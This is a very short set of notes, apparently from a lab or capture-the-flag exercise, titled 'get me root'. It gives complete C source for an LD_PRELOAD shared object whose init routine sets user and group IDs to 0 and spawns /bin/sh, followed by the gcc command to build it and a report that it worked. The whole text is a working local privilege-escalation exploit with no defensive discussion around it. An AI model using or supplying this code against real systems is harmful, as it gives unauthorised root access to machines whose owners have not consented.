get me root

  • first let’s create the root.c file and add this shell code:

    #include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
     unsetenv("LD_PRELOAD");
     setgid(0);
     setuid(0);
     system("/bin/sh");
}

  • compile gcc -fPIC -shared -o shell.so root.c -nostartfiles

  • it worked!!!
